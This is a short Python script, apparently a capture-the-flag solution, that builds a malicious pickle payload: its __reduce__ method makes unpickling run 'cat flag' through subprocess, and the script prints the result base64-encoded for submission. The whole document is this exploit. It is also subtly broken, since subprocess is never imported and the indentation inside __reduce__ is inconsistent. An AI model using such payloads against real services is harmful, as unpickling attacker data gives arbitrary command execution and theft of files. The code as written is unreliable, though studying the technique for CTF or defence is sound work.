import pickle
import base64

class Reveal:
    def __reduce__(self):
      cmd=("cat","flag")
        return subprocess.check_output,(cmd,)

payload_bytes = pickle.dumps(Reveal())
payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode()
payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)  # Fix padding

print(payload_b64)
